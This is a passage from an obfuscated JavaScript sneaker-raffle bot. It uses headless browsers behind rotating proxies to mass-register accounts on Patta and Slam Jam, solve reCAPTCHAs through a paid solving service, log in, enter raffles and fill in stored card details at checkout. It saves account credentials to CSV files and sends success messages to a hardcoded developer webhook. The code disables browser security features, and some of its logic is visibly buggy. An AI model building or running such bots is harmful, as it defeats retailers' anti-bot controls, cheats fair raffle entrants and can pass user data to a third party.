            _0x201dc6 && _0x201dc6['close'](), console['log']('Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x47614f(_0x599b27, _0x3a16f3, _0x5781f6, _0x93a64b) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x11579f = 0x0; _0x11579f < _0x5781f6['length']; _0x11579f++) {
        var _0xd9fa01 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x434d06
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xd30cf5['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x26b8e9
                }
            ]
        }];
        const _0x171768 = { 'embeds': _0xd9fa01 };
        _0x4bfd08(_0x3a16f3['name'] + '\x20Task\x20' + (_0x11579f + 0x1) + '\x20/\x20' + _0x5781f6['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad), await _0x38b36b(_0x5781f6, _0x11579f);
        var _0x5f080c = await _0xff2c9f(_0x5781f6[_0x11579f], _0x3a16f3, 'acc', ![]);
        const _0x3bade2 = { 'succesDEVMSG': { 'embeds': [_0x5f080c] } };
        if (_0x5781f6[_0x11579f]['Email'] == '' || _0x5781f6[_0x11579f]['FirstName'] == '' || _0x5781f6[_0x11579f]['LastName'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x11579f + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4f800b(0x7d0);
            continue;
        }
        (_0x5781f6[_0x11579f]['Password'] == '' || _0x5781f6[_0x11579f] == undefined) && _0x5781f6[_0x11579f]['Password'] == 'JRaffles23!';
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x4c8dbc = _0x93a64b[_0x11579f]['split'](':');
        else
            var _0x6f693 = Math['round'](Math['random']() * (_0x93a64b['length'] - 0x1)), _0x4c8dbc = _0x93a64b[_0x6f693]['split'](':');
        const _0x249570 = await _0x168014['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4c8dbc[0x0] + ':' + _0x4c8dbc[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1feac8 = await _0x249570['newPage']();
            await _0x1feac8['authenticate']({
                'username': '' + _0x4c8dbc[0x2],
                'password': '' + _0x4c8dbc[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x3a16f3['name'] + ']\x20Task\x20' + (_0x11579f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1feac8['setRequestInterception'](!![]), _0x1feac8['on']('request', _0x296144 => {
                _0x296144['resourceType']() === 'image' || _0x296144['resourceType']() === 'font' || _0x296144['resourceType']() === 'media' ? _0x296144['abort']() : _0x296144['continue']();
            }), await _0x1feac8['goto'](_0x599b27), await _0x4f800b(0xbb8), await _0x1feac8['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x57a400() + '\x20[' + _0x3a16f3['name'] + ']\x20Task\x20' + (_0x11579f + 0x1) + '\x20:\x20Filling\x20information'), await _0x1feac8['type']('#RegisterForm-FirstName', '' + _0x5781f6[_0x11579f]['FirstName']), await _0x4f800b(0x226), await _0x1feac8['type']('#RegisterForm-LastName', '' + _0x5781f6[_0x11579f]['LastName']), await _0x4f800b(0x226), await _0x1feac8['type']('#RegisterForm-email', '' + _0x5781f6[_0x11579f]['Email']), await _0x4f800b(0x226), await _0x1feac8['type']('#RegisterForm-password', '' + _0x5781f6[_0x11579f]['Password']), await _0x4f800b(0x226), console['log'](_0x57a400() + '\x20[' + _0x3a16f3['name'] + ']\x20Task\x20' + (_0x11579f + 0x1) + '\x20:\x20Submitting..'), await _0x1feac8['$eval']('#RegisterForm', _0x2a0e88 => _0x2a0e88['submit']()), await _0x4f800b(0x1f40);
            try {
                await _0x1feac8['waitForSelector']('.home-page-grid__collection'), await _0x4f800b(0x1f4), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x3a16f3['name'] + ']\x20Task\x20' + (_0x11579f + 0x1) + '\x20:\x20Account\x20' + _0x5781f6[_0x11579f]['Email'] + '\x20Generated!')), _0x76f3de['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x5781f6[_0x11579f]['Email'] + ',' + _0x5781f6[_0x11579f]['Password']), console['log'](_0x41434e['yellow'](_0x57a400() + '\x20[' + _0x3a16f3['name'] + ']\x20Task\x20' + (_0x11579f + 0x1) + '\x20:\x20Account\x20' + _0x5781f6[_0x11579f]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x3bade2['succesDEVMSG']);
                } catch {
                }
                await _0x5f2c92(_0x22ad4d, _0x3bade2['succesDEVMSG']);
            } catch (_0x1ea511) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x11579f + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1ea511));
            }
        } catch (_0x171802) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x11579f + 0x1) + '\x20:\x20' + _0x171802));
        } finally {
            _0x249570 && _0x249570['close'](), console['log']('Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x10c4e3(_0x2df596, _0x3706fd, _0x51d3de, _0x56103b) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x330ccb = 0x0; _0x330ccb < _0x51d3de['length']; _0x330ccb++) {
        var _0x10aa93, _0x1454b1 = '', _0x124aa8 = 0x0;
        _0x4bfd08(_0x3706fd['name'] + '\x20Task\x20' + (_0x330ccb + 0x1) + '\x20/\x20' + _0x51d3de['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad), await _0x38b36b(_0x51d3de, _0x330ccb);
        if (_0x51d3de[_0x330ccb]['Email'] == '' || _0x51d3de[_0x330ccb]['Password'] == '' || _0x51d3de[_0x330ccb]['FirstName'] == '' || _0x51d3de[_0x330ccb]['LastName'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x4c37ed = _0x56103b[_0x330ccb]['split'](':');
        else
            var _0x2afa8c = Math['round'](Math['random']() * (_0x56103b['length'] - 0x1)), _0x4c37ed = _0x56103b[_0x2afa8c]['split'](':');
        const _0x462162 = await _0x168014['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4c37ed[0x0] + ':' + _0x4c37ed[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2d8d61 = await _0x462162['newPage']();
            await _0x2d8d61['authenticate']({
                'username': '' + _0x4c37ed[0x2],
                'password': '' + _0x4c37ed[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x3706fd['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2d8d61['setRequestInterception'](!![]), _0x2d8d61['on']('request', _0x186a56 => {
                _0x186a56['resourceType']() === 'image' || _0x186a56['resourceType']() === 'font' || _0x186a56['resourceType']() === 'media' ? _0x186a56['abort']() : _0x186a56['continue']();
            }), await _0x2d8d61['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x2d8d61['waitForSelector']('#CustomerEmail'), console['log'](_0x57a400() + '\x20[' + _0x3706fd['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2d8d61['type']('#CustomerEmail', '' + _0x51d3de[_0x330ccb]['Email']), await _0x4f800b(0x12c), await _0x2d8d61['type']('#CustomerPassword', '' + _0x51d3de[_0x330ccb]['Password']), await _0x4f800b(0x226), await _0x2d8d61['$eval']('#customer_login', _0x4098ef => _0x4098ef['submit']());
            try {
                await _0x2d8d61['waitForSelector']('#orders'), await _0x4f800b(0x4b0);
            } catch {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x3706fd['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x2d8d61['goto']('' + _0x51d3de[_0x330ccb]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x4f800b(0xbb8), console['log'](_0x57a400() + '\x20[' + _0x3706fd['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x2d8d61['waitForSelector']('#email');
            } catch {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x3706fd['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x2d8d61['type']('#email', '' + _0x51d3de[_0x330ccb]['Email']), await _0x4f800b(0x384), await _0x2d8d61['type']('#first_name', '' + _0x51d3de[_0x330ccb]['FirstName']), await _0x4f800b(0x514), await _0x2d8d61['type']('#last_name', '' + _0x51d3de[_0x330ccb]['LastName']), await _0x4f800b(0x514), await _0x2d8d61['type']('#street_address', _0x51d3de[_0x330ccb]['Address1'] + '\x20' + _0x51d3de[_0x330ccb]['HouseNumber'] + '\x20' + _0x51d3de[_0x330ccb]['Address2']), await _0x4f800b(0x2bc);
            _0x51d3de[_0x330ccb]['Postcode'] == undefined && (_0x51d3de[_0x330ccb]['Postcode'] = _0x51d3de[_0x330ccb]['Zip']);
            await _0x2d8d61['type']('#zip_code', '' + _0x51d3de[_0x330ccb]['Postcode']), await _0x4f800b(0x320), await _0x2d8d61['type']('#city', '' + _0x51d3de[_0x330ccb]['City']), await _0x4f800b(0x320), await _0x2d8d61['type']('#bday', '01/01/1994'), await _0x4f800b(0x320), await _0x2d8d61['type']('#instagram', '' + _0x51d3de[_0x330ccb]['Follower']), await _0x4f800b(0x352);
            if (_0x51d3de[_0x330ccb]['Size'] == 'RANDOM') {
                const _0x277ae8 = await _0x2d8d61['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x267c62 => {
                    return _0x267c62['map'](_0x50c8ec => _0x50c8ec['textContent']);
                });
                var _0x55f5c = Math['round'](Math['random']() * (_0x277ae8['length'] - 0x1));
                console['log'](_0x57a400() + '\x20[' + _0x3706fd['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x277ae8[_0x55f5c]), await _0x2d8d61['click']('label[data-eu-size=\x22' + _0x277ae8[_0x55f5c] + '\x22]');
            } else {
                console['log'](_0x57a400() + '\x20[' + _0x3706fd['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x51d3de[_0x330ccb]['Size']);
                try {
                    await _0x2d8d61['click']('label[data-eu-size=\x22' + _0x51d3de[_0x330ccb]['Size'] + '\x22]');
                } catch {
                    await _0x2d8d61['click']('label[data-eu-size=\x22' + _0x51d3de[_0x330ccb]['Size'] + '.0\x22]');
                }
            }
            await _0x4f800b(0xbb8), await _0x2d8d61['$$eval']('.raffle__checkbox-label', _0x548c21 => _0x548c21['forEach'](_0x22fa13 => _0x22fa13['click']())), await _0x4f800b(0x7d0), console['log'](_0x57a400() + '\x20[' + _0x3706fd['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x2d8d61['click']('#raffle__form-submit'), await _0x4f800b(0x1388);
            try {
                await _0x2d8d61['waitForSelector']('#raffle__confirmation-message-container'), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x3706fd['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x5cbb45) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x5cbb45));
            }
        } catch (_0x18a098) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20' + _0x18a098)), _0x1454b1 = 'yes';
        } finally {
            _0x462162 && _0x462162['close']();
            if (_0x1454b1 == 'yes' && _0x124aa8 != 0x5) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x3706fd['name'] + ']\x20Task\x20' + (_0x330ccb + 0x1) + '\x20:\x20Retrying')), _0x330ccb = _0x330ccb - 0x1, _0x124aa8 = _0x124aa8 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x4ee861(_0x54d7c0, _0x117203, _0x5adb43, _0x143542) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x99353 = 0x0; _0x99353 < _0x5adb43['length']; _0x99353++) {
        var _0x2eda27 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x434d06
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xd30cf5['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x26b8e9
                }
            ]
        }];
        const _0x37e358 = { 'embeds': _0x2eda27 };
        _0x4bfd08(_0x117203['name'] + '\x20Task\x20' + (_0x99353 + 0x1) + '\x20/\x20' + _0x5adb43['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad), await _0x38b36b(_0x5adb43, _0x99353);
        var _0x2434a1 = await _0xff2c9f(_0x5adb43[_0x99353], _0x117203, 'acc', ![]);
        const _0x2ce008 = { 'succesDEVMSG': { 'embeds': [_0x2434a1] } };
        if (_0x5adb43[_0x99353]['Email'] == '' || _0x5adb43[_0x99353]['FirstName'] == '' || _0x5adb43[_0x99353]['LastName'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x99353 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4f800b(0x7d0);
            continue;
        }
        (_0x5adb43[_0x99353]['Password'] == '' || _0x5adb43[_0x99353] == undefined) && _0x5adb43[_0x99353]['Password'] == 'JRaffles23!';
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x480a57 = _0x143542[_0x99353]['split'](':');
        else
            var _0x55edea = Math['round'](Math['random']() * (_0x143542['length'] - 0x1)), _0x480a57 = _0x143542[_0x55edea]['split'](':');
        const _0x428c77 = await _0x168014['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x480a57[0x0] + ':' + _0x480a57[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xd89856 = await _0x428c77['newPage']();
            await _0xd89856['authenticate']({
                'username': '' + _0x480a57[0x2],
                'password': '' + _0x480a57[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x117203['name'] + ']\x20Task\x20' + (_0x99353 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd89856['setRequestInterception'](!![]), _0xd89856['on']('request', _0x5c27f9 => {
                _0x5c27f9['resourceType']() === 'image' || _0x5c27f9['resourceType']() === 'font' || _0x5c27f9['resourceType']() === 'media' ? _0x5c27f9['abort']() : _0x5c27f9['continue']();
            }), await _0xd89856['goto']('https://drop.slamjam.com/account/register'), await _0x4f800b(0xbb8), await _0xd89856['waitForSelector']('#FirstName'), await _0xd89856['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xd89856['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x57a400() + '\x20[' + _0x117203['name'] + ']\x20Task\x20' + (_0x99353 + 0x1) + '\x20:\x20Filling\x20information'), await _0x4f800b(0x4b0), await _0xd89856['type']('#FirstName', '' + _0x5adb43[_0x99353]['FirstName']), await _0x4f800b(0x226), await _0xd89856['type']('#LastName', '' + _0x5adb43[_0x99353]['LastName']), await _0x4f800b(0x226), await _0xd89856['type']('#Email', '' + _0x5adb43[_0x99353]['Email']), await _0x4f800b(0x2ee), await _0xd89856['type']('#ConfirmEmail', '' + _0x5adb43[_0x99353]['Email']), await _0x4f800b(0x2ee), await _0xd89856['type']('#CreatePassword', '' + _0x5adb43[_0x99353]['Password']), await _0x4f800b(0x2ee), await _0xd89856['type']('#CreateConfirmPassword', '' + _0x5adb43[_0x99353]['Password']), await _0x4f800b(0x226), console['log'](_0x57a400() + '\x20[' + _0x117203['name'] + ']\x20Task\x20' + (_0x99353 + 0x1) + '\x20:\x20Submitting..'), await _0xd89856['$eval']('#create_customer', _0x18ee3e => _0x18ee3e['submit']()), await _0x4f800b(0x1388), console['log'](_0x57a400() + '\x20[' + _0x117203['name'] + ']\x20Task\x20' + (_0x99353 + 0x1) + '\x20:\x20' + _0x41434e['cyan']('Solving\x20Captcha')), await _0xd89856['solveRecaptchas'](), console['log'](_0x57a400() + '\x20[' + _0x117203['name'] + ']\x20Task\x20' + (_0x99353 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0xd89856['$eval']('.shopify-challenge__container\x20>\x20form', _0x4487c7 => _0x4487c7['submit']());
            try {
                await _0xd89856['waitForSelector']('.product-card__image'), await _0x4f800b(0x1f4), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x117203['name'] + ']\x20Task\x20' + (_0x99353 + 0x1) + '\x20:\x20Account\x20' + _0x5adb43[_0x99353]['Email'] + '\x20Generated!')), _0x76f3de['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x5adb43[_0x99353]['Email'] + ',' + _0x5adb43[_0x99353]['Password']), console['log'](_0x41434e['yellow'](_0x57a400() + '\x20[' + _0x117203['name'] + ']\x20Task\x20' + (_0x99353 + 0x1) + '\x20:\x20Account\x20' + _0x5adb43[_0x99353]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x2ce008['succesDEVMSG']);
                } catch {
                }
                await _0x5f2c92(_0x22ad4d, _0x2ce008['succesDEVMSG']);
            } catch (_0x43823d) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x99353 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x43823d));
            }
        } catch (_0x42f5f7) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x99353 + 0x1) + '\x20:\x20' + _0x42f5f7));
        } finally {
            _0x428c77 && _0x428c77['close'](), console['log']('Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x4289e7(_0x788115, _0x15ae94, _0x1ac93b, _0x3d47df) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5a5066 = 0x0; _0x5a5066 < _0x1ac93b['length']; _0x5a5066++) {
        var _0x182406, _0x22bf80 = '', _0xd7b747 = 0x0;
        _0x4bfd08(_0x15ae94['name'] + '\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20/\x20' + _0x1ac93b['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad), await _0x38b36b(_0x1ac93b, _0x5a5066);
        if (_0x1ac93b[_0x5a5066]['Email'] == '' || _0x1ac93b[_0x5a5066]['Password'] == '' || _0x1ac93b[_0x5a5066]['FirstName'] == '' || _0x1ac93b[_0x5a5066]['LastName'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x1ed8d3 = _0x3d47df[_0x5a5066]['split'](':');
        else
            var _0x523913 = Math['round'](Math['random']() * (_0x3d47df['length'] - 0x1)), _0x1ed8d3 = _0x3d47df[_0x523913]['split'](':');
        const _0x47964e = await _0x168014['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1ed8d3[0x0] + ':' + _0x1ed8d3[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x2cffbc = await _0x47964e['newPage']();
            await _0x2cffbc['authenticate']({
                'username': '' + _0x1ed8d3[0x2],
                'password': '' + _0x1ed8d3[0x3]
            }), await _0x2cffbc['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2cffbc['setRequestInterception'](!![]), _0x2cffbc['on']('request', _0x383949 => {
                _0x383949['resourceType']() === 'image' || _0x383949['resourceType']() === 'font' || _0x383949['resourceType']() === 'media' ? _0x383949['abort']() : _0x383949['continue']();
            }), await _0x2cffbc['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x2cffbc['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2cffbc['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4f800b(0x258), await _0x2cffbc['waitForSelector']('#CustomerEmail'), console['log'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2cffbc['type']('#CustomerEmail', '' + _0x1ac93b[_0x5a5066]['Email']), await _0x4f800b(0x12c), await _0x2cffbc['type']('#CustomerPassword', '' + _0x1ac93b[_0x5a5066]['Password']), await _0x4f800b(0x226), await _0x2cffbc['$eval']('#customer_login', _0x13602c => _0x13602c['submit']()), await _0x4f800b(0x7d0), await _0x2cffbc['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20' + _0x41434e['cyan']('Solving\x20Captcha')), await _0x2cffbc['solveRecaptchas'](), console['log'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x2cffbc['$eval']('.shopify-challenge__container\x20>\x20form', _0x578f9d => _0x578f9d['submit']());
            try {
                await _0x2cffbc['waitForSelector']('.nav-account'), await _0x4f800b(0x4b0);
            } catch {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x2cffbc['goto']('' + _0x1ac93b[_0x5a5066]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x4f800b(0xbb8), console['log'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x2cffbc['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x2cffbc['click']('.product-select-variant-wrapper'), await _0x4f800b(0x320), await _0x2cffbc['click']('li.product-select-variant__value[data-size=\x22' + _0x1ac93b[_0x5a5066]['Size'] + '\x22]'), await _0x4f800b(0x384), await _0x2cffbc['$eval']('#AddToCartForm-product-template-raffle', _0x24b8c9 => _0x24b8c9['submit']()), await _0x2cffbc['waitForSelector']('.cart-order-summary__content'), await _0x4f800b(0x514), await _0x2cffbc['goto']('https://drop.slamjam.com/checkout'), await _0x4f800b(0x514), await _0x2cffbc['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2cffbc['select']('#checkout_shipping_address_country', '' + _0x1ac93b[_0x5a5066]['Country']), await _0x4f800b(0x200), await _0x2cffbc['waitForSelector']('#checkout_shipping_address_first_name'), await _0x2cffbc['type']('#checkout_shipping_address_first_name', '' + _0x1ac93b[_0x5a5066]['FirstName']), await _0x4f800b(0x237), await _0x2cffbc['type']('#checkout_shipping_address_last_name', '' + _0x1ac93b[_0x5a5066]['LastName']), await _0x4f800b(0x1e0), await _0x2cffbc['type']('#checkout_shipping_address_address1', _0x1ac93b[_0x5a5066]['Address1'] + '\x20' + _0x1ac93b[_0x5a5066]['HouseNumber']), await _0x4f800b(0x514), await _0x2cffbc['type']('#checkout_shipping_address_address2', '' + _0x1ac93b[_0x5a5066]['Address2']), await _0x4f800b(0x514);
            _0x1ac93b[_0x5a5066]['Postcode'] == undefined && (_0x1ac93b[_0x5a5066]['Postcode'] = _0x1ac93b[_0x5a5066]['Zip']);
            await _0x2cffbc['type']('#checkout_shipping_address_zip', '' + _0x1ac93b[_0x5a5066]['Postcode']), await _0x4f800b(0x2bc), await _0x2cffbc['type']('#checkout_shipping_address_city', '' + _0x1ac93b[_0x5a5066]['City']), await _0x4f800b(0x320), await _0x2cffbc['type']('#checkout_shipping_address_phone', '' + _0x1ac93b[_0x5a5066]['Phone']), await _0x4f800b(0x320), await _0x2cffbc['click']('#continue_button'), await _0x4f800b(0xbb8), await _0x2cffbc['waitForSelector']('.summary-title'), await _0x4f800b(0x320), await _0x2cffbc['click']('#continue_button'), await _0x4f800b(0x320), console['log'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x2cffbc['waitForSelector']('#checkout_credit_card_vault'), await _0x4f800b(0x3e8);
            var _0x2ae52f = await _0x2cffbc['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x3b239d = await _0x2ae52f['contentFrame']();
            await _0x3b239d['click']('#number'), await _0x4f800b(0x3e8), await _0x3b239d['type']('#number', '' + _0x1ac93b[_0x5a5066]['CardNumber'], { 'delay': 0x78 }), _0x2ae52f = await _0x2cffbc['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x3b239d = await _0x2ae52f['contentFrame'](), await _0x4f800b(0x1c2), await _0x3b239d['click']('#name'), await _0x4f800b(0x1f4), await _0x3b239d['type']('#name', '' + _0x1ac93b[_0x5a5066]['NameOnCard'], { 'delay': 0x78 }), _0x2ae52f = await _0x2cffbc['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x3b239d = await _0x2ae52f['contentFrame'](), await _0x4f800b(0x1c2), await _0x3b239d['click']('#expiry'), await _0x4f800b(0x1f4), await _0x3b239d['type']('#expiry', '' + _0x1ac93b[_0x5a5066]['ExpiryDate'], { 'delay': 0x78 }), _0x2ae52f = await _0x2cffbc['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x3b239d = await _0x2ae52f['contentFrame'](), await _0x4f800b(0x1c2), await _0x3b239d['click']('#verification_value'), await _0x4f800b(0x1f4), await _0x3b239d['type']('#verification_value', '' + _0x1ac93b[_0x5a5066]['CVV'], { 'delay': 0x78 }), await _0x2cffbc['$eval']('#accepts-flag-raffle', _0x358e1c => _0x358e1c['click']()), await _0x4f800b(0x7d0), console['log'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x2cffbc['$eval']('#continue_button', _0x1d5550 => _0x1d5550['click']()), await _0x4f800b(0x1b58), await _0x2cffbc['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x2cffbc['$eval']('.edit_checkout.animate-floating-labels', _0x5bb77c => _0x5bb77c['submit']()), await _0x4f800b(0x7d0);
            try {
                await _0x2cffbc['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x48b860) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x48b860['message']);
            }
